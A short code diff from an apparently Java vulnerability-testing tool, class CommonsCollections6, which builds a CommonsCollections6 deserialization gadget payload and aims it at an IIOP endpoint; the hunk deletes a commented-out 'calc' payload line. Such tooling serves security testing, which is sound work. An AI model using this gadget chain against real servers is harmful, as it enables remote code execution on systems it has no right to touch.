@@ -99,7 +99,6 @@ public class CommonsCollections6 implements VulTest {
         ctClass.defrost();
         ObjectPayload<Serializable> objectPayload = new CommonsCollections6Gadget();
         Object object = objectPayload.getObject(bytes,new String[]{bindName}, callClazz.getSimpleName(),null);
-//        object = objectPayload.getObject("calc",null);
         ContextPojo contextPojo = null;
         String iiopUrl = String.format("iiop://%s:%s", ip, port);
         try{
